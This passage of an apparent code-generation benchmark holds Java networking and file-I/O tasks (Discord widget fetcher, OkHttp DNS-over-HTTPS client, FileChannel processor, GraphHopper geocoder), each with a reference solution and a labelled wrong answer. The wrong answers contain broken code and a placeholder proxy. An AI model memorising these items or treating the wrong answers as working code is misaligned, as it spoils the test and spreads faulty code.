System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + host);\n            System.exit(1);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.socket.DatagramChannel;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\n\npublic class DatagramChannelEchoClient {\n    private String host;\n    private int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() {\n        group = new EventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(DatagramChannel.class)\n                .handler(new ChannelInitializer<DatagramChannel>() {\n                    @Override\n                    protected void initChannel(DatagramChannel ch) {\n                        ch.pipeline().addLast(new MyHandler());\n                    }\n                });\n        try {\n            channel = bootstrap.bind(0).sync().channel();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (channel == null) {\n            System.err.println(\"Channel not initialized\");\n            return;\n        }\n        try {\n            ByteBuf buf = Unpooled.copiedBuffer(message, StandardCharsets.UTF_8);\n            DatagramPacket packet = new DatagramPacket(buf, new InetSocketAddress(host, port));\n            channel.writeAndFlush(packet);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    public void runConsoleInput() {\n        new Thread(() -> {\n            try {\n                while (true) {\n                    String input = System.console().readLine();\n                    if (input == null || input.equalsIgnoreCase(\"exit\")) {\n                        break;\n                    }\n                    sendMessage(input);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    private static class MyHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof DatagramPacket) {\n                DatagramPacket packet = (DatagramPacket) msg;\n                String received = new String(packet.content().array(), StandardCharsets.UTF_8);\n                System.out.println(\"Received: \" + received);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a utility class for retrieving Discord guild widget information using HTTP requests.\n\nClass Description: WidgetUtil is a utility class that provides functionality to fetch Discord guild widget data through REST API calls. It handles HTTP communication, response processing, and error handling for widget retrieval operations.\n\nAttributes:\nWIDGET_URL: [String] - The URL template for accessing Discord guild widget JSON data, using the default REST API base URL.\n\nMethods:\ngetWidget: [getWidget]([long guildId]) -> [Widget] - Retrieves the widget information for a specified Discord guild ID. Handles various HTTP response codes including success (200), not found (404), forbidden (403), and rate limiting (429). Throws RateLimitedException when rate limited and UncheckedIOException for IO errors. Returns null if the widget doesn't exist or is inaccessible.",
    "Canonical_solution": "import net.dv8tion.jda.api.entities.Widget;\nimport net.dv8tion.jda.api.exceptions.RateLimitedException;\nimport net.dv8tion.jda.api.requests.RestConfig;\nimport net.dv8tion.jda.api.utils.data.DataObject;\nimport net.dv8tion.jda.internal.entities.WidgetImpl;\nimport net.dv8tion.jda.internal.utils.Checks;\nimport net.dv8tion.jda.internal.utils.IOUtil;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n\nimport javax.annotation.Nonnull;\nimport javax.annotation.Nullable;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.UncheckedIOException;\n\npublic class WidgetUtil \n{\n    public static final String WIDGET_URL = RestConfig.DEFAULT_BASE_URL + \"guilds/%s/widget.json\";\n\n    @Nullable\n    public static Widget getWidget(long guildId) throws RateLimitedException\n    {\n        Checks.notNull(guildId, \"GuildId\");\n\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n                    .url(String.format(WIDGET_URL, guildId))\n                    .method(\"GET\", null)\n                    .header(\"user-agent\", RestConfig.USER_AGENT)\n                    .header(\"accept-encoding\", \"gzip\")\n                    .build();\n\n        try (Response response = client.newCall(request).execute())\n        {\n            final int code = response.code();\n            InputStream data = IOUtil.getBody(response);\n\n            switch (code)\n            {\n                case 200:\n                    try (InputStream stream = data)\n                    {\n                        return new WidgetImpl(DataObject.fromJson(stream));\n                    }\n                    catch (IOException e)\n                    {\n                        throw new UncheckedIOException(e);\n                    }\n                case 400:\n                case 404:\n                    return null;\n                case 403:\n                    return new WidgetImpl(guildId);\n                case 429:\n                    long retryAfter;\n                    try (InputStream stream = data)\n                    {\n                        retryAfter = DataObject.fromJson(stream).getLong(\"retry_after\");\n                    }\n                    catch (Exception e)\n                    {\n                        retryAfter = 0;\n                    }\n                    throw new RateLimitedException(WIDGET_URL, retryAfter);\n                default:\n                    throw new IllegalStateException(\"An unknown status was returned: \" + code + \" \" + response.message());\n            }\n        }\n        catch (IOException e)\n        {\n            throw new UncheckedIOException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class WidgetUtil {\n    private static final String WIDGET_URL = \"https://discord.com/api/guilds/{guildId}/widget\";\n\n    public Widget getWidget(long guildId) {\n        try {\n            String url = WIDGET_URL.replace(\"{guildId}\", Long.toString(guildId));\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(url))\n                    .GET()\n                    .build();\n\n            HttpResponse<String> response = HttpClient.newHttpClient().send(request, HttpResponse.BodyHandlers.ofString());\n\n            int statusCode = response.statusCode();\n\n            if (statusCode == 200) {\n                ObjectMapper mapper = new ObjectMapper();\n                return mapper.readValue(response.body(), Widget.class);\n            } else if (statusCode == 403 || statusCode == 404) {\n                return null;\n            } else if (statusCode == 429) {\n                throw new RateLimitedException(\"Rate limited\");\n            } else {\n                throw new UncheckedIOException(new IOException(\"HTTP error \" + statusCode));\n            }\n        } catch (IOException | InterruptedException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 238,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using OkHttp library, supporting both regular and DNS-over-HTTPS (DoH) connections, with caching capabilities and custom DNS fallback mechanisms.\n\nClass Description: The HttpClient class provides static methods for performing HTTP GET and POST requests with configurable caching and DNS options. It maintains four different client configurations (regular/DoH with/without cache) and handles response processing with error checking.\n\nAttributes:\n- httpClient: [OkHttpClient] - Standard HTTP client without cache\n- httpClientDoH: [OkHttpClient] - HTTP client with DNS-over-HTTPS support\n- httpClientWithCache: [OkHttpClient] - HTTP client with caching enabled\n- httpClientWithCacheDoH: [OkHttpClient] - HTTP client with both caching and DoH\n- fallbackDNS: [FallBackDNS] - Custom DNS resolver with fallback functionality\n- doh: [boolean] - Flag indicating whether DoH is enabled\n\nMethods:\n- getHttpClient() -> [OkHttpClient] - Returns appropriate HTTP client based on DoH setting\n- getHttpClientWithCache() -> [OkHttpClient] - Returns cached HTTP client based on DoH setting\n- doHttpGet(String url, boolean allowCache) -> [byte[]] - Performs HTTP GET request and returns response body as bytes\n- doHttpPost(String url, String data, boolean allowCache) -> [byte[]] - Performs HTTP POST request with JSON payload and returns response body as bytes\n- followRedirects(OkHttpClient.Builder builder, boolean followRedirects) -> [OkHttpClient.Builder] - Configures redirect following behavior for client builder\n- checkNeedCaptchaAndroidacy(String url, int errorCode) -> [void] - Checks if Androidacy URL requires captcha\n- JsonRequestBody: [static inner class] - Custom RequestBody implementation for JSON data\n\nStatic Initialization Block:\n- Initializes all HTTP client configurations with timeout settings, proxy configuration, and DNS setup (including DoH fallback)",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Handler;\nimport android.os.Looper;\n\nimport com.fox2code.mmm.MainApplication;\nimport com.fox2code.mmm.R;\nimport com.fox2code.mmm.androidacy.AndroidacyUtil;\n\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\n\nimport javax.net.ssl.SSLException;\n\nimport okhttp3.Cache;\nimport okhttp3.Dns;\nimport okhttp3.HttpUrl;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport okhttp3.dnsoverhttps.DnsOverHttps;\nimport okhttp3.logging.HttpLoggingInterceptor;\nimport okio.BufferedSink;\nimport timber.log.Timber;\n\npublic class HttpClient {\n    private static final OkHttpClient httpClient;\n    private static final OkHttpClient httpClientDoH;\n    private static final OkHttpClient httpClientWithCache;\n    private static final OkHttpClient httpClientWithCacheDoH;\n    private static final FallBackDNS fallbackDNS;\n    private static boolean doh;\n\n    static {\n        MainApplication mainApplication = MainApplication.getINSTANCE();\n        OkHttpClient.Builder httpclientBuilder = new OkHttpClient.Builder();\n        httpclientBuilder.connectTimeout(5, TimeUnit.SECONDS);\n        httpclientBuilder.writeTimeout(10, TimeUnit.SECONDS);\n        httpclientBuilder.readTimeout(15, TimeUnit.SECONDS);\n        httpclientBuilder.proxy(Proxy.NO_PROXY);\n        Dns dns = Dns.SYSTEM;\n        try {\n            InetAddress[] cloudflareBootstrap = new InetAddress[]{InetAddress.getByName(\"162.159.36.1\"), InetAddress.getByName(\"162.159.46.1\"), InetAddress.getByName(\"1.1.1.1\"), InetAddress.getByName(\"1.0.0.1\"), InetAddress.getByName(\"162.159.132.53\"), InetAddress.getByName(\"2606:4700:4700::1111\"), InetAddress.getByName(\"2606:4700:4700::1001\"), InetAddress.getByName(\"2606:4700:4700::0064\"), InetAddress.getByName(\"2606:4700:4700::6400\")};\n            dns = s -> {\n                if (\"cloudflare-dns.com\".equals(s)) {\n                    return Arrays.asList(cloudflareBootstrap);\n                }\n                return Dns.SYSTEM.lookup(s);\n            };\n            httpclientBuilder.dns(dns);\n            dns = new DnsOverHttps.Builder().client(httpclientBuilder.build()).url(Objects.requireNonNull(HttpUrl.parse(\"https://cloudflare-dns.com/dns-query\"))).bootstrapDnsHosts(cloudflareBootstrap).resolvePrivateAddresses(true).build();\n        } catch (UnknownHostException | RuntimeException e) {\n            Timber.e(e, \"Failed to init DoH\");\n        }\n        fallbackDNS = new FallBackDNS(mainApplication, dns, \"github.com\", \"api.github.com\", \"raw.githubusercontent.com\", \"camo.githubusercontent.com\", \"user-images.githubusercontent.com\", \"cdn.jsdelivr.net\", \"img.shields.io\", \"magisk-modules-repo.github.io\", \"www.androidacy.com\", \"api.androidacy.com\", \"production-api.androidacy.com\");\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClient = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientDoH = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.cache(new Cache(new File(mainApplication.getCacheDir(), \"http_cache\"), 16L * 1024L * 1024L));\n        httpclientBuilder.dns(Dns.SYSTEM);\n        httpClientWithCache = followRedirects(httpclientBuilder, true).build();\n        httpclientBuilder.dns(fallbackDNS);\n        httpClientWithCacheDoH = followRedirects(httpclientBuilder, true).build();\n        doh = MainApplication.isDohEnabled();\n    }\n\n    private static OkHttpClient.Builder followRedirects(OkHttpClient.Builder builder, boolean followRedirects) {\n        return builder.followRedirects(followRedirects).followSslRedirects(followRedirects);\n    }\n\n    public static OkHttpClient getHttpClient() {\n        return doh ? httpClientDoH : httpClient;\n    }\n\n    public static OkHttpClient getHttpClientWithCache() {\n        return doh ? httpClientWithCacheDoH : httpClientWithCache;\n    }\n\n    @SuppressLint(\"RestrictedApi\")\n    public static byte[] doHttpGet(String url, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).get().build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            if (response.code() == 401 && AndroidacyUtil.isAndroidacyLink(url)) {\n                throw new HttpException(\"Androidacy token is invalid\", 401);\n            }\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    public static byte[] doHttpPost(String url, String data, boolean allowCache) throws IOException {\n        Response response = (allowCache ? getHttpClientWithCache() : getHttpClient()).newCall(new Request.Builder().url(url).post(JsonRequestBody.from(data)).header(\"Content-Type\", \"application/json\").build()).execute();\n        if (response.code() != 200 && response.code() != 204 && (response.code() != 304 || !allowCache)) {\n            checkNeedCaptchaAndroidacy(url, response.code());\n            throw new HttpException(response.code());\n        }\n        ResponseBody responseBody = response.body();\n        if (response.code() == 304) {\n            response = response.cacheResponse();\n            if (response != null) responseBody = response.body();\n        }\n        return responseBody.bytes();\n    }\n\n    private static void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n        if (errorCode == 403 && AndroidacyUtil.isAndroidacyLink(url)) {\n            needCaptchaAndroidacyHost = Uri.parse(url).getHost();\n        }\n    }\n\n    private static class JsonRequestBody extends RequestBody {\n        private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json\");\n        private static final JsonRequestBody EMPTY = new JsonRequestBody(new byte[0]);\n        final byte[] data;\n\n        private JsonRequestBody(byte[] data) {\n            this.data = data;\n        }\n\n        static JsonRequestBody from(String data) {\n            if (data == null || data.length() == 0) {\n                return EMPTY;\n            }\n            return new JsonRequestBody(data.getBytes(StandardCharsets.UTF_8));\n        }\n\n        @Override\n        public MediaType contentType() {\n            return JSON_MEDIA_TYPE;\n        }\n\n        @Override\n        public long contentLength() {\n            return this.data.length;\n        }\n\n        @Override\n        public void writeTo(@NonNull BufferedSink bufferedSink) throws IOException {\n            bufferedSink.write(this.data);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class HttpClient {\n    private static OkHttpClient httpClient;\n    private static OkHttpClient httpClientDoH;\n    private static OkHttpClient httpClientWithCache;\n    private static OkHttpClient httpClientWithCacheDoH;\n    private static FallBackDNS fallbackDNS;\n    private static boolean doh;\n\n    static {\n        fallbackDNS = new FallBackDNS();\n        httpClient = new OkHttpClient.Builder()\n                .connectTimeout(30, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(30, TimeUnit.SECONDS)\n                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080)))\n                .dns(fallbackDNS)\n                .build();\n\n        httpClientDoH = new OkHttpClient.Builder()\n                .connectTimeout(30, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(30, TimeUnit.SECONDS)\n                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080)))\n                .dns(fallbackDNS)\n                .build();\n\n        httpClientWithCache = new OkHttpClient.Builder()\n                .connectTimeout(30, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(30, TimeUnit.SECONDS)\n                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080)))\n                .cache(new Cache(new File(\"path/to/cache\"), 10 * 1024 * 1024))\n                .dns(fallbackDNS)\n                .build();\n\n        httpClientWithCacheDoH = new OkHttpClient.Builder()\n                .connectTimeout(30, TimeUnit.SECONDS)\n                .readTimeout(30, TimeUnit.SECONDS)\n                .writeTimeout(30, TimeUnit.SECONDS)\n                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080)))\n                .cache(new Cache(new File(\"path/to/cache\"), 10 * 1024 * 1024))\n                .dns(fallbackDNS)\n                .build();\n\n        doh = true;\n    }\n\n    public static OkHttpClient getHttpClient() {\n        return doh ? httpClientDoH : httpClient;\n    }\n\n    public static OkHttpClient getHttpClientWithCache() {\n        return doh ? httpClientWithCacheDoH : httpClientWithCache;\n    }\n\n    public static byte[] doHttpGet(String url, boolean allowCache) {\n        OkHttpClient client = doh ? httpClientDoH : httpClient;\n        if (allowCache) {\n            client = doh ? httpClientWithCacheDoH : httpClientWithCache;\n        }\n        Request request = new Request.Builder()\n                .url(url)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            return response.body().bytes();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public static byte[] doHttpPost(String url, String data, boolean allowCache) {\n        OkHttpClient client = doh ? httpClientDoH : httpClient;\n        if (allowCache) {\n            client = doh ? httpClientWithCacheDoH : httpClientWithCache;\n        }\n        RequestBody body = new JsonRequestBody(data);\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            return response.body().bytes();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public static OkHttpClient.Builder followRedirects(OkHttpClient.Builder builder, boolean followRedirects) {\n        if (followRedirects) {\n            builder.followRedirects(true);\n        }\n        return builder;\n    }\n\n    public static void checkNeedCaptchaAndroidacy(String url, int errorCode) {\n        // Implementation to check if captcha is needed\n    }\n\n    public static class JsonRequestBody implements RequestBody {\n        private final String data;\n\n        public JsonRequestBody(String data) {\n            this.data = data;\n        }\n\n        @Override\n        public MediaType contentType() {\n            return MediaType.get(\"application/json; charset=utf-8\");\n        }\n\n        @Override\n        public long contentLength() throws IOException {\n            return data.getBytes(StandardCharsets.UTF_8).length;\n        }\n\n        @Override\n        public void writeTo(BufferedSink sink) throws IOException {\n            sink.writeUtf8(data);\n        }\n    }\n}"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a Java class that provides file processing capabilities using Java NIO's FileChannel for efficient file operations including memory-mapped file access and direct buffer reading.\n\nClass Description: FileChannelProcessor is a utility class that handles file operations using Java NIO's FileChannel. It supports memory-mapped file access (MappedByteBuffer) and direct buffer reading (ByteBuffer) with methods for opening/closing channels, mapping file segments, reading buffer segments, and finding line boundaries in buffers.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nfilePath: Path - The path to the file being processed\nMAX_LINE_LENGTH: int (static final) - Maximum expected line length for boundary finding\nMMAP_CHUNK_SIZE: int (static final) - Maximum size for memory-mapped file segments\n\nMethods:\nopenChannel: void() throws IOException - Opens a read-only FileChannel for the specified file path\nmapFileSegment: MappedByteBuffer(long start, long size) throws IOException - Maps a file segment into memory as a read-only MappedByteBuffer\nreadBufferSegment: ByteBuffer(long position, int length) throws IOException - Reads a file segment into a direct ByteBuffer\nfindLineBoundary: long(ByteBuffer buffer, long startPosition) - Finds the position of the next line boundary in a buffer\ncloseChannel: void() throws IOException - Closes the FileChannel if it's open\ngetFileSize: long() throws IOException - Returns the size of the file associated with the FileChannel",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private static final int MAX_LINE_LENGTH = 128;\n    private static final int MMAP_CHUNK_SIZE = Integer.MAX_VALUE / 32;\n\n    private FileChannel fileChannel;\n    private Path filePath;\n\n    public FileChannelProcessor(Path filePath) {\n        this.filePath = filePath;\n    }\n\n    public void openChannel() throws IOException {\n        this.fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buf = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buf, position);\n        return buf;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        int w = MAX_LINE_LENGTH;\n        while (buffer.get(w - 1) != '\\n') {\n            w--;\n        }\n        return startPosition + w;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelProcessor {\n    public static final int MAX_LINE_LENGTH = 1024;\n    public static final int MMAP_CHUNK_SIZE = 8192;\n\n    private FileChannel fileChannel;\n    private Path filePath;\n\n    public void openChannel() throws IOException {\n        fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocateDirect(length);\n        int bytesRead = fileChannel.read(buffer, position);\n        buffer.flip();\n        return buffer;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        if (startPosition >= buffer.capacity()) {\n            return -1;\n        }\n        for (long i = startPosition; i < startPosition + MAX_LINE_LENGTH && i < buffer.capacity(); i++) {\n            if (buffer.get(i) == '\\n') {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Java class that implements geocoding functionality using the GraphHopper API, allowing both forward and reverse geocoding operations through HTTP requests.\n\nClass Description: The GraphHopperGeocoding class provides methods to perform geocoding operations by communicating with the GraphHopper API service. It handles HTTP client configuration, request building, response processing, and error handling.\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- downloader: OkHttpClient - HTTP client for making requests\n- routeServiceUrl: String - Base URL for the GraphHopper geocoding API\n- key: String - API key for authentication\n- DEFAULT_TIMEOUT: long - Default timeout value for HTTP requests (5000ms)\n\nMethods:\n- GraphHopperGeocoding() -> Constructor - Initializes with default GraphHopper API URL\n- GraphHopperGeocoding(String serviceUrl) -> Constructor - Initializes with custom service URL\n- geocode(GHGeocodingRequest request) -> GHGeocodingResponse - Performs geocoding operation based on request parameters\n- setDownloader(OkHttpClient downloader) -> GraphHopperGeocoding - Sets custom HTTP client\n- setKey(String key) -> void - Sets API key for authentication\n- getDownloader() -> OkHttpClient - Returns current HTTP client instance\n- getClientForRequest(GHGeocodingRequest request) -> OkHttpClient - Returns configured HTTP client with appropriate timeout\n- buildUrl(GHGeocodingRequest request) -> String - Constructs API request URL with proper parameters\n- encodeURL(String str) -> String - URL-encodes string parameters (private helper method)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport com.graphhopper.api.model.GHGeocodingRequest;\nimport com.graphhopper.api.model.GHGeocodingResponse;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URLEncoder;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GraphHopperGeocoding {\n\n    private final ObjectMapper objectMapper;\n    private OkHttpClient downloader;\n    private String routeServiceUrl;\n    private String key = \"\";\n    private final long DEFAULT_TIMEOUT = 5000;\n\n    public GraphHopperGeocoding() {\n        this(\"https://graphhopper.com/api/1/geocode\");\n    }\n\n    public GraphHopperGeocoding(String serviceUrl) {\n        this.routeServiceUrl = serviceUrl;\n        downloader = new OkHttpClient.Builder().\n                connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                build();\n        objectMapper = new ObjectMapper();\n    }\n\n    public GHGeocodingResponse geocode(GHGeocodingRequest request) {\n        String url = buildUrl(request);\n        try {\n            Request okRequest = new Request.Builder().url(url)\n                    .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                    .build();\n            Response rsp = getClientForRequest(request).newCall(okRequest).execute();\n            ResponseBody rspBody = rsp.body();\n            if (!rsp.isSuccessful())\n                throw new RuntimeException(rspBody.string());\n            GHGeocodingResponse geoRsp = objectMapper.readValue(rspBody.bytes(), GHGeocodingResponse.class);\n            return geoRsp;\n        } catch (IOException ex) {\n            throw new RuntimeException(\"IO problem for geocoding URL \" + url + \": \" + ex.getMessage(), ex);\n        }\n    }\n\n    public GraphHopperGeocoding setDownloader(OkHttpClient downloader) {\n        this.downloader = downloader;\n        return this;\n    }\n\n    public void setKey(String key) {\n        this.key = key;\n    }\n\n    public OkHttpClient getDownloader() {\n        return downloader;\n    }\n\n    private OkHttpClient getClientForRequest(GHGeocodingRequest request) {\n        OkHttpClient client = this.downloader;\n        if (request.hasTimeout()) {\n            long timeout = request.getTimeout();\n            client = client.newBuilder()\n                    .connectTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .readTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .build();\n        }\n        return client;\n    }\n\n    private String buildUrl(GHGeocodingRequest request) {\n        String url = routeServiceUrl + \"?\";\n        if (request.isReverse()) {\n            if (!request.getPoint().isValid())\n                throw new IllegalArgumentException(\"For reverse geocoding you have to pass valid lat and long values\");\n            url += \"reverse=true\";\n        } else {\n            if (request.getQuery() == null)\n                throw new IllegalArgumentException(\"For forward geocoding you have to a string for the query\");\n            url += \"reverse=false\";\n            url += \"&q=\" + encodeURL(request.getQuery());\n        }\n\n        if (request.getPoint().isValid())\n            url += \"&point=\" + request.getPoint().getLat() + \",\" + request.getPoint().getLon();\n\n        url += \"&limit=\" + request.getLimit();\n        url += \"&locale=\" + encodeURL(request.getLocale());\n        url += \"&provider=\" + encodeURL(request.getProvider());\n\n        if (!key.isEmpty()) {\n            url += \"&key=\" + encodeURL(key);\n        }\n        return url;\n    }\n\n    private static String encodeURL(String str) {\n        try {\n            return URLEncoder.encode(str, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class GraphHopperGeocoding {\n    private final ObjectMapper objectMapper;\n    private OkHttpClient downloader;\n    private String routeServiceUrl;\n    private String key;\n    private static final long DEFAULT_TIMEOUT = 5000;\n\n    public GraphHopperGeocoding() {\n        this.routeServiceUrl = \"https://graphhopper.com/api/1/geocode\";\n        this.objectMapper = new ObjectMapper();\n    }\n\n    public GraphHopperGeocoding(String serviceUrl) {\n        this.routeServiceUrl = serviceUrl;\n        this.objectMapper = new ObjectMapper();\n    }\n\n    public GraphHopperGeocoding setDownloader(OkHttpClient downloader) {\n        this.downloader = downloader;\n        return this;\n    }\n\n    public void setKey(String key) {\n        this.key = key;\n    }\n\n    public OkHttpClient getDownloader() {\n        return downloader;\n    }\n\n    private OkHttpClient getClientForRequest(GHGeocodingRequest request) {\n        if (downloader == null) {\n            downloader = new OkHttpClient.Builder()\n                    .connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                    .readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                    .build();\n        }\n        return downloader;\n    }\n\n    private String buildUrl(GHGeocodingRequest request) {\n        StringBuilder urlBuilder = new StringBuilder(routeServiceUrl);\n        urlBuilder.append(\"?query=\").append(encodeURL(request.getQuery()));\n        if (request.getLimit() != null) {\n            urlBuilder.append(\"&limit=\").append(request.getLimit());\n        }\n        return urlBuilder.toString();\n    }\n\n    private String encodeURL(String str) {\n        try {\n            return URLEncoder.encode(str, StandardCharsets.UTF_8.toString());\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"Encoding failed\", e);\n        }\n    }\n\n    public GHGeocodingResponse geocode(GHGeocodingRequest request) {\n        OkHttpClient client = getClientForRequest(request);\n        String url = buildUrl(request);\n        Request requestObj = new Request.Builder()\n                .url(url)\n                .addHeader(\"Authorization\", \"Bearer \" + key)\n                .build();\n\n        try (Response response = client.newCall(requestObj).execute()) {\n            if (!response.isSuccessful()) {\n                throw new IOException(\"Unexpected code \" + response.code());\n            }\n            String responseBody = response.body().string();\n            return objectMapper.readValue(responseBody, GHGeocodingResponse.class);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error during geocoding\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 243,
